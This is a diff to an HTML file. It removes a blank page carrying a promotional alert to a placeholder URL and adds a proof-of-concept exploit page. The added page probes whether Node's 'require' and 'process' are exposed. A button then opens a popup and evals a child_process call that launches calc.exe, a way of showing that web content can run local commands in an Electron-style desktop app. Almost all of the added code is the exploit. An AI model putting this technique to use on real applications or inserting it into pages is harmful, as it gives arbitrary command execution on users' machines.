@@ -1,14 +1,20 @@
-<!DOCTYPE html>
-<html>
-    <head>
-        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-        <title></title>
-        
-    </head>
-    <body>
-        
-    </body>
+ <html>
+ <body>
+ <pre id="out">加载中...</pre>
+ <button onclick="go()" style="font-size:18px;padding:10px">Click</button>
+ <script>
+ document.getElementById('out').innerText =
+     'require: ' + typeof require + '\n' +
+     'process: ' + typeof process + '\n' +
+     'window.open: ' + typeof window.open;
 
-
-<script>alert('官方会员领取请前往：https://xx.com')</script>
-</html>
+ function go() {
+     var w = window.open('about:blank');
+     if (!w) { alert('popup blocked!'); return; }
+     setTimeout(function() {
+         w.eval("require('child_process').exec('calc.exe')");
+     }, 500);
+ }
+ </script>
+ </body>
+ </html>
